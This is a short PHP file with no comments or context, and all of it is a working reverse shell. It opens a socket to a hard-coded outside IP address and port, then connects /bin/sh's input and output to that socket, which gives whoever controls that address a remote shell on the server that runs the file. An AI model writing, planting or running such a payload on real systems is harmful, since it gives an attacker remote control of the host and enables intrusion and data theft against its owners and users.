<?php
$sock = fsockopen('123.206.203.108', 9876);$descriptorspec = array(0 => $sock,1 => $sock,2 => $sock);$process = proc_open('/bin/sh', $descriptorspec, $pipes);proc_close($process);
